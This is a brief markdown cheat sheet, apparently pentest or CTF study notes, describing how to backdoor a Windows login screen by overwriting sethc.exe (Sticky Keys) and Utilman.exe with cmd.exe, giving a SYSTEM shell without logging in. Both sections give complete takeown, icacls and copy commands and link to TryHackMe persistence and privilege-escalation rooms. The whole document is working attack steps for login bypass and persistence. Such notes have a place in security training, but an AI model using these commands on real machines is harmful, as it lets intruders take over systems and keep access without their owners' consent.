# Classic Windows Login/Lock Screen Hacks
## Sticky Keys
Pressing Shift 5 times triggers `C:\Windows\System32\sethc.exe`. On unencrypted Windows systems, replacing that with cmd.exe will get you a shell running as SYSTEM without logging in.

```powershell
# Take ownership of the file (requires admin privileges).
#
takeown /f c:\Windows\System32\sethc.exe

# Grant the current user permission to modify it.
#
icacls C:\Windows\System32\sethc.exe /grant $CURRENT_USER:F

# Overwrite with cmd.exe.
#
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

### Additional Resources
* [TryHackMe: Windows Privilege Escalation](https://tryhackme.com/room/windowsprivesc20)
* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 

## Utilman
`Utilman.exe` is the built-in Windows app to provide Ease of Access options from the lock screen. It’s launched by clicking on the Ease of Access button.

It can be replaced in the same fashion as `sethc.exe`.

```powershell
# Take ownership of the file (requires admin privileges).
#
takeown /f c:\Windows\System32\Utilman.exe

# Grant the current user permission to modify it.
#
icacls C:\Windows\System32\Utilman.exe /grant $CURRENT_USER:F

# Overwrite with cmd.exe.
#
copy c:\Windows\System32\cmd.exe `
	C:\Windows\System32\Utilman.exe
```

### Additional Resources
* [TryHackMe: Windows Local Persistence](https://tryhackme.com/room/windowslocalpersistence) 
